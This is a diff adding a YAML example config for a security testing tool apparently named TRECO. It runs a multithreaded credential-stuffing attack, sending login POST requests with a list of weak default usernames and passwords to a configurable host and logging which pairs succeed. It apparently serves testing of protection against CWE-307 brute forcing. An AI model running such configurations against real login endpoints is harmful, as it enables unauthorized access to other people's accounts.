@@ -1,0 +1,54 @@
+# ============================================================================
+# TRECO Example: Product Mode - Credential Stuffing
+# ============================================================================
+
+metadata:
+  name: "Input Product Example - Credential Stuffing"
+  version: "1.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-307"
+
+target:
+  host: "{{ env('TARGET_HOST', 'example.com') }}"
+  port: 443
+  tls:
+    enabled: true
+    verify_cert: false
+
+entrypoint:
+  state: credential_stuffing
+  input:
+    usernames:
+      - "admin"
+      - "root"
+      - "test"
+      - "user"
+    passwords:
+      - "admin123"
+      - "password"
+      - "root123"
+      - "test123"
+
+states:
+  credential_stuffing:
+    description: "Test all username/password combinations"
+    
+    race:
+      threads: 16
+      input_mode: product
+      sync_mechanism: barrier
+    
+    request: |
+      POST /api/login HTTP/1.1
+      Host: {{ target.host }}
+      Content-Type: application/json
+      
+      {"username": "{{ input.username }}", "password": "{{ input.password }}"}
+    
+    logger:
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+        🟢 T{{ thread.id }}: {{ input.username }}:{{ input.password }} SUCCESS
+        {% else %}
+        🔴 T{{ thread.id }}: {{ input.username }}:{{ input.password }} Failed
+        {% endif %}
